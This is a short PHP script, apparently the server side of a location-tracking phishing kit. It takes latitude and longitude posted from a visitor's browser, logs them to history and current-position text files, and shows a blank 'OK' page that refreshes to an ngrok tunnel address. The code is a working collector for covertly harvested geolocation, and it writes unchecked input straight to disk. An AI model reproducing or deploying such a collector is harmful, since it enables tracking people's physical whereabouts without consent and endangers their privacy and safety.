<?php

$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];




$hist_lat = "\n$latitude";

$dados_lat = fopen('hist_lat.txt', 'a');

fwrite($dados_lat, $hist_lat);

fclose($dados_lat);
########################################
$hist_long = "\n$longitude";

$dados_long = fopen('hist_long.txt', 'a');

fwrite($dados_long, $hist_long);

fclose($dados_long);

########

$lat = "$latitude";

$lat_file = fopen('lat.txt', 'w');

fwrite($lat_file, $lat);

fclose($lat_file);

$long = "$longitude";

$long_file = fopen('long.txt', 'w');

fwrite($long_file, $long);

fclose($long_file);

?>

<!DOCTYPE html>
<html>
<head>
	<title>OK</title>
	<meta http-equiv="refresh" content="5; URL=https://17b8e7dc2f31.ngrok.io/index.php" />
</head>
<body>

</body>
</html>


 